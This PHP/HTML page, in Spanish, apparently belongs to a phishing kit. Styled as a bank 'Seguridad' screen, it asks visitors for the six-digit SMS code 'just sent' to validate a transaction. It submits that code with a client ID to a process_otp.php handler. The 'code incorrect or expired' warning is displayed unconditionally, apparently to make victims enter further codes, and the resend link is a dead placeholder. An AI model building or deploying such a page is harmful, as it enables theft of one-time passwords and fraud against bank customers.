<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad</title>

    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .details {
            margin-top: 40%;
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            width: 120px;
        }

        a {
            display: block;
            color: rgb(105, 105, 105);
            text-decoration: none;
            margin: 10px 0;
        }

        input[type="text"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"] {
            color: white;
            background-color: black;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 80%;
            height: 35px;
            margin-top: 10px;
        }

        input[type="submit"]:hover {
            background-color: darkgray;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="details">
        <img src="img/logo.png" alt="Logo" width="120px">
        <h3>Vamos a validar tu transacción</h3>
        <a>Ingresa el código SMS que acabamos de enviar a tu número de celular.</a><br>
        <form action="process/process_otp.php" method="POST">
            <label><b>Digite el Código:</b></label>
            <input type="hidden" name="cliente_id"
                value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
            <input type="text" name="claveDinamica" placeholder="Clave dinámica" required minlength="6" maxlength="6"
                pattern="\d*" inputmode="numeric">
            <a style="color:rgb(255, 0, 0); margin-bottom:0px; ">Tu código no es correcto o ha éxpirado</a>
            <input type="submit" value="Activar">
        </form>
    </div>

    <div class="footer-links">
        <a href="#" style="color:black;">Presione aquí para recibir un nuevo código</a>
    </div>
</body>

</html>
